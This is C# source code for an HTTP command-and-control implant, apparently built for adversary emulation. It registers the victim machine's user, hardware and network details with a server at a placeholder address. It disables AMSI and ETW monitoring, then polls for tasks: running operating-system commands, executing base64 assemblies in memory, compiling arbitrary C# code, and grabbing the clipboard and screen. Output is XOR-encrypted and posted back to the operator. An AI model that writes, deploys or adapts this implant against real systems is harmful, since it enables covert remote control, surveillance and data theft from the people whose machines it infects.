using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text;
using System.Timers;
using HTTPImplant.Modules;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Linq;

namespace HTTPImplant
{
    public class Command
    {
        public string Input { get; set; }
        public string command { get; set; }  // Renamed to avoid conflict with class name
        public string Args { get; set; }
        public string ImplantUser { get; set; }
        public string Operator { get; set; }
        public string TimeToExec { get; set; }
        public string Delay { get; set; }
        public string File { get; set; }
        public string usesmb { get; set; }
    }

    public class Victim
    {
        public string ID { get; set; }  
        public string DeviceName { get; set; }
        public string Username { get; set; }
        public int OperatorID { get; set; }
        public string Network { get; set; }
        public string OperatingSystem { get; set; }
        public string CPU { get; set; }
        public string GPU { get; set; }
        public int RAM { get; set; }
        public string Storage { get; set; }
        public string CurrentDate { get; set; }
    }
    // This Implant class acts as the entry point of the implant program.
    public class Implant
    {
        public static Victim victim = new Victim();
        public static string host = "<IP>";  // Host of the implant server
        public static string port = "<PORT>"; // Port of the implant server
        private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
        public static bool SMB = false;
        private static bool usesmb;

        public static void Main(string[] args)
        {
/*            string output = Powerless.Exec(args[0]);
            Console.WriteLine(output);
            Environment.Exit(0);*/
            /*ClipboardFetcher.GetData();
            Environment.Exit(0);*/
            /*ScreenGrab.CaptureScreen();
            Environment.Exit(0);*/
            DoAsync().GetAwaiter().GetResult();
        }
        public static async Task DoAsync()
        {
            string implantId = Environment.MachineName;
            string lastCommandExecuted = string.Empty;

            string victim_information = GenerateJson();

            // Console.WriteLine(victim_information);
            // Console.WriteLine("Registering Implant...");

            await RegisterImplant(victim_information);
            var victim = new Victim();

            victim = GetVictim(victim);
            /*
            Console.WriteLine("ID: " + victim.ID);
            Console.WriteLine("DeviceName: " + victim.DeviceName);
            Console.WriteLine("Username: " + victim.Username);
            Console.WriteLine("OperatorID: " + victim.OperatorID);
            Console.WriteLine("CPUArchitecture: " + victim.CPU);
            Console.WriteLine("GPUInfo: " + victim.GPU);
            Console.WriteLine("RAMInfo: " + victim.RAM);
            Console.WriteLine("OSName: " + victim.OperatingSystem);
            Console.WriteLine("NetworkInfo: " + victim.Network);
            Console.WriteLine("CurrentDate: " + victim.CurrentDate);
            */

            AmsiHBP.Start();

            EtwPatch.Start();

            //TestStomper("localhost", "8000", "calc64.bin");

            using (WebClient webClient = new WebClient())
            {

                while (true)
                {
                    try
                    {
                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://" + host + ":" + port + "/getCommand"));
                        Console.WriteLine("Getting instructions...");

                        Command command = new Command();
                        command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("Input: " + command.Input);
*/
                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("Command: " + command.command);
*/
                        command.Args = jsonResponse.Split(new string[] { "\"Args\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("Args: " + command.Args);
*/
                        command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("ImplantUser: " + command.ImplantUser);
*/
                        command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("Operator: " + command.Operator);
*/
                        command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("Delay: " + command.Delay);
*/
                        command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("TimeToExec: " + command.TimeToExec);
*/
                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"usesmb" }, StringSplitOptions.None)[1];
                        /*Console.WriteLine("File: " + command.File);
*/
                        command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\"}" }, StringSplitOptions.None)[1];
/*                        Console.WriteLine("usesmb: " + command.usesmb);*/


                        if (!bool.TryParse(command.usesmb, out usesmb))

                        if (usesmb)
                        {
                            SMB = true; // Assuming SMB is a boolean variable
                        } else
                        {
                            SMB = false;
                        }


                        /*Console.WriteLine("User for issued command: " + command.ImplantUser);
                        Console.WriteLine("Current implant user: " + victim.Username);*/

                        if (command.ImplantUser == victim.Username)
                        {
                            do
                            {
                                // Check if lastCommandExecuted is empty
                                if (string.IsNullOrEmpty(lastCommandExecuted))
                                {
                                    lastCommandExecuted = command.Input;
                                    continue; // Restart the loop
                                }

                                await Task.Delay(5000);

                                // Update lastCommandExecuted
                                lastCommandExecuted = command.Input;

                                string inputCommand = command.Input.Trim().ToLower();
                                switch (inputCommand)
                                {
                                    case "execute-assembly":
                                        Console.WriteLine("Running assembly");
                                        byte[] bytes = Convert.FromBase64String(command.File);
                                        string outputAssembly = ExecuteAssembly.Execute(bytes);
                                        string outputBase64Assembly = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputAssembly));
                                        Console.WriteLine(outputAssembly);
                                        await SendResult(webClient, implantId, command.Operator, outputBase64Assembly, SMB);
                                        break;

                                    case "os":
                                        Console.WriteLine("Running command: " + command.command);
                                        string outputOS = Commands.command(command.command, command.Args);
                                        string outputBase64OS = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputOS));
                                        await SendResult(webClient, implantId, command.Operator, outputBase64OS, SMB);
                                        break;

                                    case "clip":
                                        Console.WriteLine("Running clipboard fetcher... ");
                                        string outputClip = ClipboardFetcher.GetData();
                                        string outputBase64Clip = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputClip));
                                        await SendResult(webClient, implantId, command.Operator, outputBase64Clip, SMB);
                                        break;

                                    case "screengrab":
                                        Console.WriteLine("Running screen fetcher... ");
                                        string outputScreen = ScreenGrab.CaptureScreen();
                                        await SendResult(webClient, implantId, command.Operator, outputScreen, SMB);
                                        break;

                                    /*case "powerless":
                                        string outputPowerless = Powerless.Exec("Get-Process");
                                        Console.WriteLine(outputPowerless);
                                        string outputBase64Powerless = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputPowerless));
                                        Console.WriteLine(outputBase64Powerless);
                                        await SendResult(webClient, implantId, command.Operator, outputPowerless, SMB);
                                        break;*/

                                    case "loadcs":
                                        Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
                                        try
                                        {
                                            string sourceCode = "using System;\n\nclass Program {\n    public static void Main()\n    {\n        Console.WriteLine(\"Hello Adversary Emulator Program\");\n    }\n}";

                                            string encodedSourceCode = command.File;

                                            Console.WriteLine("Encoded Source Code: \n" + encodedSourceCode);

                                            byte[] code = Convert.FromBase64String(encodedSourceCode);
                                            string decodedSourceCode = Encoding.UTF8.GetString(code);

                                            Console.WriteLine("Decoded Source Code: \n" + decodedSourceCode);

                                            CompileAndRunNET.ExecuteCS(decodedSourceCode);
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine("Exception caught: " + ex.ToString());
                                        }
                                        break;

                                    case "upload":
                                        // The code for "upload" command goes here
                                        break;

                                    default:
                                        Console.WriteLine("Unknown command: " + inputCommand);
                                        break;
                                }

                            } while (command.Input != lastCommandExecuted);
                        }
                        else
                        {
                            Console.WriteLine("No new commands...");
                            await Task.Delay(5000);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }
        }

        public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64, bool useSMB)
        {
            useSMB = false;
            string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
            byte[] XORKey = Convert.FromBase64String(XORKeyB64);

            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
            byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);

            string data = Convert.ToBase64String(encryptedResultJson);
            if (!useSMB)
            {
                await webClient.UploadStringTaskAsync(new Uri("http://" + host + ":" + port + "/postOutput"), "POST", data);
            } else
            {
                /*SMBClient.SendData(data);*/
            }
        }

        public static byte[] XOR(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        public static string GenerateJson()
        {
            string id = GetImplantInfo.GenerateRandomString(6); // Assuming this is a random string
            string deviceName = GetImplantInfo.GetComputerName();
            string username = GetImplantInfo.Username();
            string operatingSystem = GetImplantInfo.OperatingSystem();
            int ram = GetImplantInfo.RAM(); // Assuming RAM() returns something like "16 GB"
            string cpu = GetImplantInfo.CPU();
            string gpu = GetImplantInfo.GPU();
            string storage = GetImplantInfo.Storage();
            string network = GetImplantInfo.Network().Replace("\n", "\\n").Replace("\r", "\\r").Replace("\"", "\\\"");
            string currentDate = GetImplantInfo.GetCurrentDate();
            int operatorId = 1;

            string json = "{\n" +
                "\t\"ID\": \"" + id + "\",\n" +
                "\t\"DeviceName\": \"" + deviceName + "\",\n" +
                "\t\"Username\": \"" + username + "\",\n" +
                "\t\"OperatorID\": " + operatorId + ",\n" +
                "\t\"CPUArchitecture\": \"" + cpu + "\",\n" +
                "\t\"GPUInfo\": \"" + gpu + "\",\n" +
                "\t\"RAMInfo\": " + ram + ",\n" +
                "\t\"OSName\": \"" + operatingSystem + "\",\n" +
                "\t\"NetworkInfo\": \"" + network + "\",\n" +
                "\t\"CurrentDate\": \"" + currentDate + "\"\n" +
            "}";

            return json;
        }

        public static Victim GetVictim(Victim victim)
        {
            string id = GetImplantInfo.GenerateRandomString(6); // Assuming this is a random string
            string deviceName = GetImplantInfo.GetComputerName();
            string username = GetImplantInfo.Username();
            string operatingSystem = GetImplantInfo.OperatingSystem();
            int ram = GetImplantInfo.RAM(); // Assuming RAM() returns something like "16 GB"
            string cpu = GetImplantInfo.CPU();
            string gpu = GetImplantInfo.GPU();
            string storage = GetImplantInfo.Storage();
            string network = GetImplantInfo.Network().Replace("\n", "\\n").Replace("\r", "\\r").Replace("\"", "\\\"");
            string currentDate = GetImplantInfo.GetCurrentDate();
            int operatorId = 1;

            victim.ID = id;
            victim.Username = username;
            victim.DeviceName = deviceName;
            victim.OperatingSystem = operatingSystem;
            victim.CPU = cpu;
            victim.GPU = gpu;
            victim.Storage = storage;
            victim.Network = network;
            victim.CurrentDate = currentDate;
            victim.RAM = ram;
            victim.OperatorID = operatorId;

            return victim;
        }


        public static async Task RegisterImplant(string victim_json)
        {
            using (var webClient = new WebClient())
            {
                webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
                try
                {
                    await webClient.UploadStringTaskAsync(new Uri("http://" + host + ":" + port + "/registerNewImplant"), "POST", victim_json);
                }
                catch (WebException ex)
                {
                    // Handle the exception according to your needs
                    Console.WriteLine("Error: " + ex.Message);
                }
            }
        }
    }
}
